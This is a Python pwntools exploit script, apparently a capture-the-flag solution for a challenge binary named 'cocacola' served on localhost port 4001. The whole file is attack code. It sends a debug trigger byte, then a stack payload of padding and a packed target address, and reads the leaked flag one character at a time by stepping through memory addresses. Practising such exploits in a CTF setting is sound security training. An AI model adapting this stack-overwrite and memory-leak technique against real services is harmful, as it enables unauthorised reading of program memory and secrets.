from pwn import * # noqa ignore=F405

# context.log_level = "debug"

BASE_FLAG = 0x700b1000


def get_string(target):
    # p = process("./cocacola") # noqa ignore=F405
    p = remote("localhost", 4001) # noqa ignore=F405

    p.recvuntil("Do you want to flip the flag switch? (y/n) ")

    # Send the debug 'D' and the special '\xc5' flag
    p.send("D\xc5")
    p.clean(0.3)

    # Craft the fake stack contents for the next function call
    payload = "\n" + "A"*247
    payload += p64(target) # noqa ignore=F405
    payload = payload.ljust(256)
    p.send(payload)

    # Set the something flag to prevent triggering the initialization of the
    # struct
    p.send("\x00")

    # Read the leaked flag
    p.recvuntil("Error: ")
    flag_char = p.recv(1)
    p.close()

    return flag_char


def main():
    current_flag = ""
    current_target = BASE_FLAG
    while "}" not in current_flag:
        try:
            current_flag += get_string(current_target)
            current_target += 32
        except Exception:
            pass

    log.success("Flag: %s" % current_flag) # noqa ignore=F405


if __name__ == "__main__":
    main()
